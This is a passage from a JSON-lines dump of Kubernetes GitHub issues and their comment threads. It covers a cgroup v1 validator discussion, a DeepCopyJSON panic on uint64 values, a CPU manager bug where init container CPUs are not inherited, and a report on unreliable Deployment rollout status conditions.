`SYSTEMD_CGROUP_ENABLE_LEGACY_FORCE=1` just seems to be a mimic so the `cpuset` won't be available as far as I understand. "}, {"author": "pacoxu", "body": "https://github.com/kubernetes/system-validators/blob/a7fadf67da1228984480d7e8dd9c8ae39803a442/validators/types_unix.go#L83\n\nhttps://github.com/kubernetes/kubernetes/blob/2fc2c0a38df83f892d6c1010646ab1c4d2c7d95f/vendor/k8s.io/system-validators/validators/types_unix.go#L83-L84\n\nLet me check. the cpuset controller check was added long time ago which seems to be correct to me. "}, {"author": "saschagrunert", "body": "@pacoxu [looking at the tests I assume that we need that controller](https://github.com/search?q=repo%3Akubernetes%2Fkubernetes+cpuset+path%3A%2F%5Etest%5C%2Fe2e_node%5C%2F%2F&type=code) for cgroup v1. "}, {"author": "kannon92", "body": "> https://github.com/kubernetes/system-validators/blob/a7fadf67da1228984480d7e8dd9c8ae39803a442/validators/types_unix.go#L83\n> \n> [kubernetes/vendor/k8s.io/system-validators/validators/types_unix.go](https://github.com/kubernetes/kubernetes/blob/2fc2c0a38df83f892d6c1010646ab1c4d2c7d95f/vendor/k8s.io/system-validators/validators/types_unix.go#L83-L84)\n> \n> Lines 83 to 84 in [2fc2c0a](/kubernetes/kubernetes/commit/2fc2c0a38df83f892d6c1010646ab1c4d2c7d95f)\n> \n>  Cgroups: []string{\"cpu\", \"cpuacct\", \"cpuset\", \"devices\", \"freezer\", \"memory\", \"pids\"}, \n>  CgroupsOptional: []string{ \n> Let me check. the cpuset controller check was added long time ago which seems to be correct to me.\n\nThis validator check works for cgroup v1 containerd: https://testgrid.k8s.io/sig-node-containerd#cos-cgroupv1-containerd-node-e2e.\n"}, {"author": "kannon92", "body": "I took this to sig-node-ci today and we decided to go forward with dropping cgroup v1 testing on fedora.\n\nhttps://github.com/kubernetes/test-infra/pull/35577\n\nThis issue is no longer relevant.\n\n/close"}, {"author": "k8s-ci-robot", "body": "@kannon92: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134142#issuecomment-3330486847):\n\n>I took this to sig-node-ci today and we decided to go forward with dropping cgroup v1 testing on fedora.\n>\n>https://github.com/kubernetes/test-infra/pull/35577\n>\n>This issue is no longer relevant.\n>\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 62769, "issue_url": "https://github.com/kubernetes/kubernetes/issues/62769", "issue_title": "DeepCopyJSON causes a panic", "issue_author": "ash2k", "issue_body": "**What happened**:\r\nI have a Custom Resource with a `map[string]interface{}` field in the corresponding Go struct. I have generated most of the DeepCopy functions for it but for that field I have to make the deep copying myself (cannot be generated because of that `interface{}`). It calls `runtime.DeepCopyJSON()` function to do the copying.\r\nWhen I run my integration tests against a cluster with `KUBE_CACHE_MUTATION_DETECTOR=true` I get the following panic:\r\n```\r\ngoroutine 67 [running]:\r\nvendor/k8s.io/apimachinery/pkg/util/runtime.HandleCrash(0x0, 0x0, 0x0)\r\n        vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:58 +0x16b\r\npanic(0x53918e0, 0xc420462080)\r\n        GOROOT/src/runtime/panic.go:502 +0x24a\r\nvendor/k8s.io/apimachinery/pkg/util/runtime.HandleCrash(0x0, 0x0, 0x0)\r\n        vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:58 +0x16b\r\npanic(0x53918e0, 0xc420462080)\r\n        GOROOT/src/runtime/panic.go:502 +0x24a\r\nvendor/k8s.io/apimachinery/pkg/util/runtime.HandleCrash(0x0, 0x0, 0x0)\r\n        vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:58 +0x16b\r\npanic(0x53918e0, 0xc420462080)\r\n        GOROOT/src/runtime/panic.go:502 +0x24a\r\nvendor/k8s.io/apimachinery/pkg/runtime.DeepCopyJSONValue(0x534f5c0, 0xc42027ac10, 0xc42027abe0, 0xc)\r\n        vendor/k8s.io/apimachinery/pkg/runtime/converter.go:466 +0x684\r\nvendor/k8s.io/apimachinery/pkg/runtime.DeepCopyJSONValue(0x53a8d00, 0xc42019c210, 0xc4204e9650, 0xc42002e150)\r\n        vendor/k8s.io/apimachinery/pkg/runtime/converter.go:454 +0x1c8\r\nvendor/k8s.io/apimachinery/pkg/runtime.DeepCopyJSONValue(0x53a8d00, 0xc42019c1e0, 0x53a9180, 0xc4200c9e18)\r\n        vendor/k8s.io/apimachinery/pkg/runtime/converter.go:454 +0x1c8\r\nvendor/k8s.io/apimachinery/pkg/runtime.DeepCopyJSON(0xc42019c1e0, 0xc4204e9830)\r\n        vendor/k8s.io/apimachinery/pkg/runtime/converter.go:444 +0x49\r\nmy-type/v1.(*MyTypeConfigSet).DeepCopyInto(0xc4204e9750, 0xc4205bb738)\r\n        pkg/apis/composition/v1/types.go:64 +0x4e\r\nmy-type/v1.MyTypeConfigSet.DeepCopy(0xc42019c1e0, 0xc42019c1b0)\r\n        pkg/apis/composition/v1/zz_generated.deepcopy.go:47 +0x5a\r\nmy-type/v1.(*MyTypeSpec).DeepCopyInto(0xc4201b27e8, 0xc4203fa108)\r\n        pkg/apis/composition/v1/zz_generated.deepcopy.go:154 +0x45a\r\nmy-type/v1.(*MyType).DeepCopyInto(0xc4201b26e0, 0xc4203fa000)\r\n        pkg/apis/composition/v1/zz_generated.deepcopy.go:19 +0x12a\r\nmy-type/v1.(*MyType).DeepCopy(0xc4201b26e0, 0xc4201e8301)\r\n        pkg/apis/composition/v1/zz_generated.deepcopy.go:29 +0x5d\r\nmy-type/v1.(*MyType).DeepCopyObject(0xc4201b26e0, 0x54e63c0, 0xc4201b26e0)\r\n        pkg/apis/composition/v1/zz_generated.deepcopy.go:35 +0x39\r\nvendor/k8s.io/client-go/tools/cache.(*defaultCacheMutationDetector).AddObject(0xc420336e00, 0x54e63c0, 0xc4201b26e0)\r\n        vendor/k8s.io/client-go/tools/cache/mutation_detector.go:99 +0xd3\r\nvendor/k8s.io/client-go/tools/cache.(*sharedIndexInformer).HandleDeltas(0xc4201e82d0, 0x53cc3e0, 0xc420192400, 0x0, 0x0)\r\n        vendor/k8s.io/client-go/tools/cache/shared_informer.go:353 +0x1d1\r\nvendor/k8s.io/client-go/tools/cache.(*sharedIndexInformer).HandleDeltas-fm(0x53cc3e0, 0xc420192400, 0x53cc3e0, 0xc420192400)\r\n        vendor/k8s.io/client-go/tools/cache/shared_informer.go:202 +0x56\r\nvendor/k8s.io/client-go/tools/cache.(*DeltaFIFO).Pop(0xc4203f2000, 0xc420184020, 0x0, 0x0, 0x0, 0x0)\r\n        vendor/k8s.io/client-go/tools/cache/delta_fifo.go:444 +0x37d\r\nvendor/k8s.io/client-go/tools/cache.(*controller).processLoop(0xc4201de080)\r\n        vendor/k8s.io/client-go/tools/cache/controller.go:150 +0x6e\r\n...\r\n```\r\nor alternatively (why two ways to log this?):\r\n```\r\nE0418 15:02:00.239118   96944 runtime.go:66] Observed a panic: &errors.errorString{s:\"cannot deep copy uint64\"} (cannot deep copy uint64)\r\nvendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:72\r\nvendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:65\r\nvendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:51\r\nbazel-out/darwin-fastbuild/bin/external/io_bazel_rules_go/darwin_amd64_race_stripped/stdlib~/src/runtime/asm_amd64.s:573\r\nGOROOT/src/runtime/panic.go:502\r\nvendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:58\r\nbazel-out/darwin-fastbuild/bin/external/io_bazel_rules_go/darwin_amd64_race_stripped/stdlib~/src/runtime/asm_amd64.s:573\r\nGOROOT/src/runtime/panic.go:502\r\nvendor/k8s.io/apimachinery/pkg/runtime/converter.go:466\r\nvendor/k8s.io/apimachinery/pkg/runtime/converter.go:454\r\nvendor/k8s.io/apimachinery/pkg/runtime/converter.go:454\r\nvendor/k8s.io/apimachinery/pkg/runtime/converter.go:444\r\nmytype/v1/types.go:64\r\nmytype/v1/zz_generated.deepcopy.go:47\r\nmytype/v1/zz_generated.deepcopy.go:154\r\nmytype/v1/zz_generated.deepcopy.go:19\r\nmytype/v1/zz_generated.deepcopy.go:29\r\nmytype/v1/zz_generated.deepcopy.go:35\r\nvendor/k8s.io/client-go/tools/cache/mutation_detector.go:99\r\nvendor/k8s.io/client-go/tools/cache/shared_informer.go:353\r\nvendor/k8s.io/client-go/tools/cache/shared_informer.go:202\r\nvendor/k8s.io/client-go/tools/cache/delta_fifo.go:444\r\nvendor/k8s.io/client-go/tools/cache/controller.go:150\r\nvendor/k8s.io/client-go/tools/cache/controller.go:124\r\nvendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133\r\nvendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134\r\nvendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88\r\nvendor/k8s.io/client-go/tools/cache/controller.go:124\r\nvendor/k8s.io/client-go/tools/cache/shared_informer.go:227\r\n...\r\n```\r\n\r\n`cannot deep copy uint64` comes from\r\nhttps://github.com/kubernetes/kubernetes/blob/3e342077d597f7a972ceaff0f06379686bb040a3/staging/src/k8s.io/apimachinery/pkg/runtime/converter.go#L449-L468\r\n\r\nThis function was written with assumption that only `int64`/`float64` types are generated for numbers. This assumption comes from this code\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/5b27f8b8f9fcfc8405f9b34bf584abd0d168abf7/staging/src/k8s.io/apimachinery/pkg/util/json/json.go#L111-L118\r\n\r\nbut the jsoniter unmarshaler that is used in the code to parse objects coming from server does something different:\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/135d58b3941fac99ae0426e18cbda266b83ca49e/staging/src/k8s.io/apimachinery/pkg/runtime/serializer/json/json.go#L75-L88\r\n\r\nWhat do we want to do? Support `uint64` or only generate `int64`/`float64` for numbers? Would be great to only have one way to do things.\r\n\r\n**Environment**:\r\nKubernetes 1.10.0, master has the same code.\r\n\r\n/kind bug\r\n/sig api-machinery\r\n\r\n@kubernetes/sig-api-machinery-bugs ", "issue_labels": ["kind/bug", "sig/api-machinery"], "comments": [{"author": "ash2k", "body": "There is one more place that creates `uint64`:\r\nhttps://github.com/kubernetes/kubernetes/blob/1fcd199cf7366a15f0e94f2892cb5b2cb5c27efa/staging/src/k8s.io/apimachinery/pkg/runtime/converter.go#L741-L792"}, {"author": "ash2k", "body": "See PR ^ for `uint64` support."}, {"author": "lavalamp", "body": "I would advise not using a uint64 since it doesn't reliably go through json.\r\n\r\n...we should probably have a better way of telling people that, though :)"}, {"author": "liggitt", "body": "> What do we want to do? Support uint64 or only generate int64/float64 for numbers?\r\n\r\nWe should limit the decoder to int64/float64"}, {"author": "ash2k", "body": "Ok, I'm going to send another PR with the change to only use `int64`/`float64`."}, {"author": "ash2k", "body": "@thockin Could you as the author of the change to add `uint64` (here https://github.com/kubernetes/kubernetes/pull/48287/files#diff-f216f544515d2fd05d66d92c5f95a248) please confirm that you are ok with removing `uint64` support/generation or it is needed for something? I don't want us to introduce a regression."}, {"author": "ash2k", "body": "https://github.com/kubernetes/community/blob/master/contributors/devel/api-conventions.md#primitive-types explicitly says:\r\n> Do not use unsigned integers, due to inconsistent support across languages and libraries. Just validate that the integer is non-negative if that's the case.\r\n\r\nHeh, but then it also says this:\r\n> All public integer fields MUST use the Go (u)int32 or Go (u)int64 types, not (u)int (which is ambiguous depending on target platform). Internal types may use (u)int.\r\n\r\nConfusing."}, {"author": "ash2k", "body": "Alternative PR https://github.com/kubernetes/kubernetes/pull/62981"}, {"author": "book987", "body": "Still seeing `cannot deep copy uint64` here.\n\n> There is one more place that creates `uint64`:\n> \n> [kubernetes/staging/src/k8s.io/apimachinery/pkg/runtime/converter.go](https://github.com/kubernetes/kubernetes/blob/1fcd199cf7366a15f0e94f2892cb5b2cb5c27efa/staging/src/k8s.io/apimachinery/pkg/runtime/converter.go#L741-L792)\n> \n> Lines 741 to 792 in [1fcd199](/kubernetes/kubernetes/commit/1fcd199cf7366a15f0e94f2892cb5b2cb5c27efa)\n>  func structToUnstructured(sv, dv reflect.Value) error { \n>  \tst, dt := sv.Type(), dv.Type() \n>  \tif dt.Kind() == reflect.Interface && dv.NumMethod() == 0 { \n>  \t\tdv.Set(reflect.MakeMap(mapStringInterfaceType)) \n>  \t\tdv = dv.Elem() \n>  \t\tdt = dv.Type() \n>  \t} \n>  \tif dt.Kind() != reflect.Map { \n>  \t\treturn fmt.Errorf(\"cannot convert struct to: %v\", dt.Kind()) \n>  \t} \n>  \trealMap := dv.Interface().(map[string]interface{}) \n>   \n>  \tfor i := 0; i < st.NumField(); i++ { \n>  \t\tfieldInfo := fieldInfoFromField(st, i) \n>  \t\tfv := sv.Field(i) \n>   \n>  \t\tif fieldInfo.name == \"-\" { \n>  \t\t\t// This field should be skipped. \n>  \t\t\tcontinue \n>  \t\t} \n>  \t\tif fieldInfo.omitempty && isZero(fv) { \n>  \t\t\t// omitempty fields should be ignored. \n>  \t\t\tcontinue \n>  \t\t} \n>  \t\tif len(fieldInfo.name) == 0 { \n>  \t\t\t// This field is inlined. \n>  \t\t\tif err := toUnstructured(fv, dv); err != nil { \n>  \t\t\t\treturn err \n>  \t\t\t} \n>  \t\t\tcontinue \n>  \t\t} \n>  \t\tswitch fv.Type().Kind() { \n>  \t\tcase reflect.String: \n>  \t\t\trealMap[fieldInfo.name] = fv.String() \n>  \t\tcase reflect.Bool: \n>  \t\t\trealMap[fieldInfo.name] = fv.Bool() \n>  \t\tcase reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64: \n>  \t\t\trealMap[fieldInfo.name] = fv.Int() \n>  \t\tcase reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64: \n>  \t\t\trealMap[fieldInfo.name] = fv.Uint() \n>  \t\tcase reflect.Float32, reflect.Float64: \n>  \t\t\trealMap[fieldInfo.name] = fv.Float() \n>  \t\tdefault: \n>  \t\t\tsubv := reflect.New(dt.Elem()).Elem() \n>  \t\t\tif err := toUnstructured(fv, subv); err != nil { \n>  \t\t\t\treturn err \n>  \t\t\t} \n>  \t\t\tdv.SetMapIndex(fieldInfo.nameValue, subv) \n>  \t\t} \n>  \t} \n>  \treturn nil \n>  }\n\nAs @ash2k mentioned above, there's another place generate `uint64` in `structToUnstructured`.\n\nI've create a PR fixing it #134235 "}]}
{"repo": "kubernetes/kubernetes", "issue_number": 94220, "issue_url": "https://github.com/kubernetes/kubernetes/issues/94220", "issue_title": "App Containers can't inherit Init Containers CPUs - CPU Manager Static Policy", "issue_author": "k-wiatrzyk", "issue_body": "<!-- Please use this template while reporting a bug and provide as much info as possible. Not doing so may result in your bug not being addressed in a timely manner. Thanks!\r\n\r\nIf the matter is security related, please disclose it privately via https://kubernetes.io/security/\r\n-->\r\n\r\n\r\n**What happened**:. \r\nCPU Manager was configured with static policy.\r\nAppContainer couldn't be placed on the same NUMA node as InitContainer, thus couldn't inherit CPUs used by InitContainer, so it ended up with multi NUMA locality hint generated (ex. [11-false]). This can cause a pod rejection, depending on Topology Manager policy. \r\n\r\n**What you expected to happen**:\r\nAppContainer to be placed on the same NUMA node as InitContainer, if there is enough resources (and inherit InitContainer CPUs). If not, it should be placed on another NUMA node and CPUs used by InitContainer should be released back to the pool. \r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\nLeave small amount of free CPUs on NUMA0, enough to fit InitContainer, but not enough to fit AppContainer. On NUMA1 there should be enough CPUs to fit AppContainer.\r\n\r\n**Anything else we need to know?**:\r\nPart of the code that is responsible for discarding other hints: \r\nhttps://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/cpumanager/policy_static.go#L384-L392\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`): v1.19.0-rc.4.190+436f1afaf30c22\r\n- Cloud provider or hardware configuration:\r\n- OS (e.g: `cat /etc/os-release`):\r\n- Kernel (e.g. `uname -a`):\r\n- Install tools:\r\n- Network plugin and version (if this is a network-related bug):\r\n- Others:\r\n", "issue_labels": ["kind/bug", "priority/backlog", "area/kubelet", "sig/node", "triage/accepted"], "comments": [{"author": "k-wiatrzyk", "body": "/sig node \r\n "}, {"author": "k8s-ci-robot", "body": "@k-wiatrzyk: The label(s) `sig/, sig/` cannot be applied, because the repository doesn't have them\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/94220#issuecomment-679989599):\n\n>/sig node \r\n> \n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k-wiatrzyk", "body": "Test case presenting the issue: https://github.com/k-wiatrzyk/kubernetes/commit/2bb58c18c1f1771ab995181bb8c3083c5346d43b\r\n\r\nExplanation: \r\n\"_In this test case, it looks like CPUs 0 and 1 are not available for use (leaving 4 CPUs available for use on NUMA node 0, and 6 available for use on  NUMA node 1). The init container will likely get CPU 6 allocated to it, and then we will attempt to reuse that CPU to allocate to the app container (which needs 5 CPUs). Since there are only 4 CPUs available on NUMA node 0 where CPU 6 lives \u2014 the app container ends up being rejected since it can\u2019t reuse CPU 6 and be allocated to NUMA node 0 (even though it could easily be allocated on NUMA node 1)._ \""}, {"author": "k-wiatrzyk", "body": "/assign klueska "}, {"author": "pablitoergosum", "body": " I refactored above TC and managed to include it into ``TestGetTopologyHints`` function: [test case](https://github.com/k-wiatrzyk/kubernetes/commit/63925565fc871ae7a84420120196df1bd19f80ad)\r\nThis is only indicator of unwanted funcionality for now, so it fails. It will pass, when solution to the issue is implemented."}, {"author": "k-wiatrzyk", "body": "I was investigating the following solutions:\r\n\r\nCPU Inheritance:\r\n1) Hints that can't allow inheritance of all InitContainer's CPUs are stored as alternative hints - not discarded as it is done now.\r\n2) If affinity (number of NUMA nodes) of alternative hints is lesser than smallest in normal hints, then include alternative hints. \r\nSo this is only adding addition logic into `generateCPUTopologyHints`\r\n\r\nReleasing InitContainer's CPUs that are not used anymore (it requires some refactoring):\r\n1) Adding a struct describing pod in the state which would include:\r\n  - `appContainersIDs` - slice of IDs\r\n  - `reusableCPUs` for this pod - moved from policy\r\n  - `containerCPUAssignments` for the pod could be moved in here\r\n2) When pod is admitted app containers IDs are saved `appContainersIDs`\r\n3) IIUC Manager's function `AddContainer()` is called before each container start. So, when `AddContainer()` function is called on first app container (it is checked through the state), this means that all InitContainers have executed and `reusableCPUs` won't be used anymore and can be cleared (released to the pool of available CPUs - `defaultCPUSet`)\r\n\r\nThis solution won't require any higher-level changed. Maybe another solution could implement some Post Stop notification that will inform CPU Manager that container has executed and it can release resources.\r\n"}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle stale"}, {"author": "klueska", "body": "/remove-lifecycle stale"}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n/lifecycle stale"}, {"author": "fejta-bot", "body": "Stale issues rot after 30d of inactivity.\nMark the issue as fresh with `/remove-lifecycle rotten`.\nRotten issues close after an additional 30d of inactivity.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n/lifecycle rotten"}, {"author": "klueska", "body": "/remove-lifecycle rotten"}, {"author": "ehashman", "body": "/cc @fromanirh @swatisehgal @cynepco3hahue \r\n/triage accepted"}, {"author": "klueska", "body": "Some more background about this issue -- it is definitely a bug, but it is only exploitable on an uncommon edge case, where an init container asks for a smaller number of exclusive cpus than an app container does.\r\n\r\nThe common cases are:\r\n1) init containers do not ask for any exclusive CPUs at all\r\n2) init containers ask for the same number of CPUs as their app container\r\n\r\nWhile I agree this issue should be fixed to provide the expected behaviour in the long term, it should be considered low prioirity, since it likely won't be an issue in practice. Moreover, the simple workaround is to increase the number of requested CPUs in the init container to equal the number of requested CPUs in the app container and everything will work as expected, with no overhead whatsoever (since those CPUs needed to be allocated for the app container anyway)."}, {"author": "ffromani", "body": "thanks @klueska for the detailed insights.\r\n/priority backlog\r\n/area kubelet"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "ffromani", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "ffromani", "body": "/remove-lifecycle stale"}, {"author": "f18m", "body": "Hi all,\r\nI'm hitting exactly the same identical problem.\r\nAny workaround you know for this issue? I'm using Kubernetes 1.20...\r\nthanks\r\n\r\n"}, {"author": "f18m", "body": "Hi all,\r\nI'm hitting exactly the same identical problem.\r\nAny workaround you know for this issue? I'm using Kubernetes 1.20...\r\nthanks\r\n\r\n"}, {"author": "klueska", "body": "As mentioned here https://github.com/kubernetes/kubernetes/issues/94220#issuecomment-868489201, just make sure that your init container asks for the same (or more) CPUs than your app container."}, {"author": "Dingshujie", "body": "@klueska @ehashman if cpu manager allocate cpu according to the following steps: \r\n1.allocate app container\r\n2.allocate cpu from cpuset that allocated for app container, and if init container ask for more cpu\uff0callocate from remaining cpu.\r\n\r\nit can resolve inherit problem,but if init container has some performance requirement\uff0cmay be is not best allocate."}, {"author": "SergeyKanzhelev", "body": "/assign @fromanirh "}, {"author": "Dingshujie", "body": "@SergeyKanzhelev Any workaround you know for this issue?  thanks"}, {"author": "ffromani", "body": "> @SergeyKanzhelev Any workaround you know for this issue? thanks\r\n\r\nHi, the workaround was presented here: https://github.com/kubernetes/kubernetes/issues/94220#issuecomment-1050004800"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "ffromani", "body": "/remove-lifecycle stale"}, {"author": "lianghao208", "body": "> Some more background about this issue -- it is definitely a bug, but it is only exploitable on an uncommon edge case, where an init container asks for a smaller number of exclusive cpus than an app container does.\r\n> \r\n> The common cases are:\r\n> \r\n> 1. init containers do not ask for any exclusive CPUs at all\r\n> 2. init containers ask for the same number of CPUs as their app container\r\n> \r\n> While I agree this issue should be fixed to provide the expected behaviour in the long term, it should be considered low prioirity, since it likely won't be an issue in practice. Moreover, the simple workaround is to increase the number of requested CPUs in the init container to equal the number of requested CPUs in the app container and everything will work as expected, with no overhead whatsoever (since those CPUs needed to be allocated for the app container anyway).\r\n\r\n@klueska  It seems even if init containers ask for the same number of CPUs as their app container, this bug still exists, check: https://github.com/kubernetes/kubernetes/issues/122171"}, {"author": "0Bumblebee", "body": "The initContainer does not need to be tied to the core and can avoid leaks.\r\n```\r\ninitContainers:\r\n  - name: init\r\n    image: nginx\r\n    resources:\r\n      requests:\r\n        cpu: \"0.1\"\r\n        memory: \"10Mi\"\r\n      limits:\r\n        cpu: \"0.1\"\r\n        memory: \"10Mi\"\r\n  containers:\r\n  - name: main\r\n    image: nginx\r\n    resources:\r\n      requests:\r\n        cpu: \"1\"\r\n        memory: \"10Mi\"\r\n      limits:\r\n        cpu: \"1\"\r\n        memory: \"10Mi\"\r\n```\r\n\r\n@k-wiatrzyk "}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 124264, "issue_url": "https://github.com/kubernetes/kubernetes/issues/124264", "issue_title": "Deployment rollout status not reliable when using `status.conditions`", "issue_author": "sicavz", "issue_body": "### What happened?\n\nCurrently I am working on a project where we implement a Kubernetes operator and we decided that for some flows we will need to wait for some deployments to complete the rollout before advancing to some other steps from our processes.\r\nSo, for an old deployment we only update an image in the pod template and then we wait for the updated deployment to finish the rollout.\r\n\r\nThe way the status of the Deployment is built/implemented is error prone and not reliable if we only take into account the `status.conditions` (as suggested in the documentation)\n\n### What did you expect to happen?\n\nAfter updating the spec of a deployment, when the `status.ObservedGeneration` is changed to the latest `metadata.Generation`, the `status.conditions` should also be updated.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nWe found out that if:\r\n- we start with a Deployment having a `status.condition` of type `Progressing` with the reason `ProgressDeadlineExceeded`\r\n- update the deployment spec (the only change would be an image from a container from the pod template)\r\n- on a timer (every second), start retrieving the deployment using the API and check the status\r\nThen, under some circumstances (so, not always; it's a concurrency/timing issue), the first change of the `status.observedGeneration` toward the new `metadata.generation` value, comes with *no change*(!) in the `status.conditions` (the old conditions are still there *without any single change*(!)). \r\nAccording to the Kubernetes documentation (and also the way the Operator SDK checks this rollout status), the interpretation of these would lead to say that the rollout failed, which is not accurate, because the actual rollout will only start a few seconds later...\r\n\r\nThis is an example from a log describing the issue (please observe that the two blocks are logged at a few milliseconds distance and the `status.conditions` are the same even the `status.ObservedGeneration` changed):\r\n```\r\n# 10:53:18.814 > Metadata.Generation: 2 | Status >> ObservedGeneration: 1, replicas: 1 , readyReplicas: , availableReplicas: , updatedReplicas: 1, unAvailableReplicas: 1\r\n  Conditions:\r\n    @10-Apr-24 10:53:02 | 10-Apr-24 10:53:02 | Available | False | MinimumReplicasUnavailable | Deployment does not have minimum availability.\r\n    @10-Apr-24 10:53:18 | 10-Apr-24 10:53:18 | Progressing | False | ProgressDeadlineExceeded | ReplicaSet \"my-deployment-5b8dc498c\" has timed out progressing.\r\n => completed: False, failed: False\r\n\r\n# 10:53:18.818 > Metadata.Generation: 2 | Status >> ObservedGeneration: 2, replicas: 1 , readyReplicas: , availableReplicas: , updatedReplicas: , unAvailableReplicas: 1\r\n  Conditions:\r\n    @10-Apr-24 10:53:02 | 10-Apr-24 10:53:02 | Available | False | MinimumReplicasUnavailable | Deployment does not have minimum availability.\r\n    @10-Apr-24 10:53:18 | 10-Apr-24 10:53:18 | Progressing | False | ProgressDeadlineExceeded | ReplicaSet \"my-deployment-5b8dc498c\" has timed out progressing.\r\n => completed: False, failed: True\r\n```\r\n\n\n### Anything else we need to know?\n\nPlease advise on how to reliably interpret the rollout status of a Deployment.\r\n\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\n$ kubectl version\r\nClient Version: v1.28.8+k3s1\r\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\r\nServer Version: v1.28.8+k3s1\r\n```\r\n\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\nno cloud\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\nPRETTY_NAME=\"K3s v1.28.8+k3s1\"\r\n\r\n\r\n$ uname -a\r\n Linux 3432b46b9978 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 GNU/Linux\r\n\r\n\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "priority/backlog", "sig/apps", "lifecycle/rotten", 